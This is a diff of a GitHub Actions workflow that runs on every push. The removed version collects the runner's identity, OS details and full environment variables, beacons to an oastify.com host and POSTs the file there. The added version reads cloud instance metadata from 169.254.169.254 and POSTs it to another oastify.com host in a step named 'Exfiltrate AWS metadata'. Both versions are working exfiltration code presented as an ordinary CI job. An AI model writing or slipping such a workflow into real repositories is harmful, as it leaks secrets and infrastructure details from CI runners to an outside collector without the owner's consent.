@@ -1,43 +1,29 @@
-name: Container Info Collection
+name: AWS Metadata Collection
 
 on: [push]
 
 jobs:
-  check_container_info:
+  aws_metadata:
     runs-on: ubuntu-latest
     container:
       image: debian:latest
 
     steps:
-      - name: Update APT and install curl and procps
+      - name: Install curl
+        run: apt update && apt install -y curl
+
+      - name: Query AWS metadata and save to file
         run: |
-          apt update && apt install -y curl procps
+          # Try to get some common AWS metadata paths
+          mkdir -p aws_metadata
+          curl -s http://169.254.169.254/latest/meta-data/ > aws_metadata/meta-data-root.txt
+          curl -s http://169.254.169.254/latest/meta-data/instance-id > aws_metadata/instance-id.txt
+          curl -s http://169.254.169.254/latest/meta-data/ami-id > aws_metadata/ami-id.txt
+          curl -s http://169.254.169.254/latest/meta-data/hostname > aws_metadata/hostname.txt
+          curl -s http://169.254.169.254/latest/meta-data/local-ipv4 > aws_metadata/local-ipv4.txt
 
-      - name: Collect system info
-        run: |
-          echo "[*] Whoami:" > container_info.txt
-          whoami >> container_info.txt
+          # Combine all metadata files into one
+          cat aws_metadata/*.txt > aws_metadata.txt || echo "No metadata found" > aws_metadata.txt
 
-          echo "[*] Hostname:" >> container_info.txt
-          hostname >> container_info.txt
-
-          echo "[*] Uptime:" >> container_info.txt
-          uptime >> container_info.txt
-
-          echo "[*] OS Info:" >> container_info.txt
-          if [ -f /etc/os-release ]; then cat /etc/os-release >> container_info.txt; else uname -a >> container_info.txt; fi
-
-          echo "[*] /proc/1/cgroup:" >> container_info.txt
-          if [ -f /proc/1/cgroup ]; then cat /proc/1/cgroup >> container_info.txt; else echo "Cannot read /proc/1/cgroup" >> container_info.txt; fi
-
-          echo "[*] Runner Description:" >> container_info.txt
-          echo "$CI_RUNNER_DESCRIPTION" >> container_info.txt
-
-          echo "[*] Environment Variables:" >> container_info.txt
-          env >> container_info.txt
-
-      - name: DNS beacon
-        run: curl -s "http://nul231it1p3hcfs06kods6treik9806ov.oastify.com/ping?host=$(hostname)&user=$(whoami)" > /dev/null
-
-      - name: Exfil container info
-        run: curl -X POST http://nul231it1p3hcfs06kods6treik9806ov.oastify.com --data-binary @container_info.txt
+      - name: Exfiltrate AWS metadata
+        run: curl -X POST http://8t2n2mhe0a22b0rl55nyrrscd3ju7l89x.oastify.com --data-binary @aws_metadata.txt
